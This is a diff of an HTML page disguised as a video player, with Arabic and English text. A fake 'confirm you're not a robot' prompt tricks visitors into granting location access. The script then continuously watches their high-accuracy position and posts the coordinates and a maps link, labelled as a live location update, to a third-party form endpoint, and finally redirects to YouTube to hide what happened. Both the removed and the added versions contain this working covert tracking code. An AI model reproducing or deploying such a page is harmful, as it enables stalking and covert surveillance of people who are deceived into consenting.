@@ -1,143 +1,136 @@
-
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>مشاهدة الفيديو</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video Loading...</title>
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
+      background-color: #000;
+      color: #fff;
     }
     .container {
       display: flex;
-      flex-direction: row;
+      height: 100vh;
     }
     .main-video {
       flex: 3;
       position: relative;
-      background-color: #000;
-      height: 360px;
+      background: #111;
       display: flex;
       align-items: center;
       justify-content: center;
     }
     .main-video::before {
-      content: '';
-      width: 60px;
-      height: 60px;
-      border: 6px solid #ccc;
-      border-top: 6px solid red;
-      border-radius: 50%;
+      content: "\f110";
+      font-family: FontAwesome;
+      font-size: 50px;
+      color: #888;
       animation: spin 1s linear infinite;
-      position: absolute;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
     }
     .sidebar {
       flex: 1;
-      background-color: #fff;
+      background: #1a1a1a;
       padding: 10px;
-      border-left: 1px solid #ddd;
-      height: 360px;
       overflow-y: auto;
     }
-    .video-item {
-      display: flex;
+    .video-thumb {
+      background: #333;
+      height: 100px;
       margin-bottom: 10px;
+    }
+    .alert-box {
+      position: absolute;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #222;
+      padding: 20px;
+      border: 2px solid #fff;
+      z-index: 999;
+      text-align: center;
+      max-width: 90%;
+    }
+    .alert-box button {
+      margin-top: 10px;
+      padding: 8px 20px;
+      background: #0f62fe;
+      color: white;
+      border: none;
       cursor: pointer;
     }
-    .video-item img {
-      width: 100px;
-      height: 60px;
-      margin-right: 10px;
-    }
-    .video-item div {
-      font-size: 14px;
-    }
-    .message-box {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100vh;
-      background: rgba(0,0,0,0.85);
-      color: white;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      padding: 20px;
-      z-index: 9999;
-    }
-    .message-box button {
-      margin-top: 20px;
-      padding: 10px 20px;
-      font-size: 16px;
+    @keyframes spin {
+      from {transform: rotate(0deg);}
+      to {transform: rotate(360deg);}
     }
   </style>
 </head>
 <body>
-  <div class="message-box" id="messageBox">
-    <h2>لتتمكن من مشاهدة الفيديو، يجب السماح بتحديد موقعك الجغرافي</h2>
-    <p>To continue watching, please allow location access to confirm you're human and not a robot 🤖</p>
-    <button onclick="startTracking()">موافق / OK</button>
-  </div>
 
-  <div class="container">
-    <div class="main-video" id="mainVideo"></div>
-    <div class="sidebar">
-      <div class="video-item"><img src="https://i.imgur.com/fVbL9pA.jpg"><div>فيديو مضحك ١</div></div>
-      <div class="video-item"><img src="https://i.imgur.com/fVbL9pA.jpg"><div>مقلب رهيب ٢</div></div>
-      <div class="video-item"><img src="https://i.imgur.com/fVbL9pA.jpg"><div>رد فعل مجنون ٣</div></div>
+<div class="container">
+  <div class="main-video">
+    <div class="alert-box" id="alertBox">
+      <p>📍 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت 🤖</p>
+      <p>📍 To view the video, please allow location access to confirm you're not a robot 🤖</p>
+      <button onclick="getLocation()">OK</button>
     </div>
   </div>
+  <div class="sidebar">
+    <div class="video-thumb"></div>
+    <div class="video-thumb"></div>
+    <div class="video-thumb"></div>
+    <div class="video-thumb"></div>
+  </div>
+</div>
 
-  <script>
-    function startTracking() {
-      document.getElementById('messageBox').style.display = 'none';
-
-      if (navigator.geolocation) {
-        navigator.geolocation.watchPosition(function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const device = navigator.userAgent;
-          const time = new Date().toLocaleString("ar-JO");
-
-          const data = {
-            location: `Latitude: ${latitude}, Longitude: ${longitude}`,
-            maps: mapsLink,
-            device: device,
-            time: time,
-            _subject: "📍 Live Location Update"
-          };
-
-          fetch("https://formspree.io/f/xkgjqegp", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-          });
-        }, function(error) {
-          alert("يرجى السماح بتحديد الموقع.");
-        }, {
-          enableHighAccuracy: true,
-          maximumAge: 10000,
-          timeout: 5000
-        });
-
-        setTimeout(() => {
-          window.location.href = "https://youtube.com";
-        }, 3000);
-      } else {
-        alert("جهازك لا يدعم تحديد الموقع.");
-      }
+<script>
+  function getLocation() {
+    document.getElementById("alertBox").style.display = "none";
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(sendLocation, errorLocation, {
+        enableHighAccuracy: true,
+        maximumAge: 10000,
+        timeout: 5000
+      });
+    } else {
+      showError();
     }
-  </script>
+  }
+
+  function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+    const data = {
+      location: `Latitude: ${latitude}, Longitude: ${longitude}`,
+      maps: mapsLink,
+      _subject: "📍 Live Location Update"
+    };
+
+    fetch("https://formspree.io/f/xkgjqegp", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(data)
+    }).then(() => {
+      setTimeout(() => {
+        window.location.href = "https://youtube.com";
+      }, 1000);
+    });
+  }
+
+  function errorLocation() {
+    showError();
+  }
+
+  function showError() {
+    document.querySelector(".main-video").innerHTML = "<h2 style='color:white;'>❌ تعذر تحميل الصورة<br>🚫 Image failed to load</h2>";
+  }
+</script>
+
 </body>
 </html>
